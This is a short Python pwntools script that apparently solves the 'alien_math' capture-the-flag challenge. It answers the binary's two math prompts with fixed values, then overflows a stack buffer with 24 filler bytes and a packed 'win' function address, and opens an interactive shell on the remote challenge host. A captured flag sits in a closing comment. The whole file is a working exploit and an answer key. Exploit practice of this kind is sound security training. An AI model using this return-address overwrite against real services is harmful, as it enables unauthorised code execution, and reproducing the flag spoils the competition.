from pwn import *

# context.log_level = 'debug'
filename = './alien_math'
# sh = process(filename)
sh = remote('pwn.chal.csaw.io', 5004)
# sh = gdb.attach(filename) 

elf = ELF(filename)

num = "1804289383"
sh.sendlineafter("root of zopnol?",num)
num2 = "7856445899213065428791"
sh.sendlineafter("are in a qorbnorbf?",num2)
win = 0x4014FB
exp = "BBBBBBBBBBBBBBBBBBBBBBBB"+p64(win)
sh.sendlineafter("quantum entangled salwzoblrs?",exp)
sh.interactive()
# flag{w3fL15n1Rx!_y0u_r34lLy_4R3_@_fL1rBg@rpL3_m4573R!}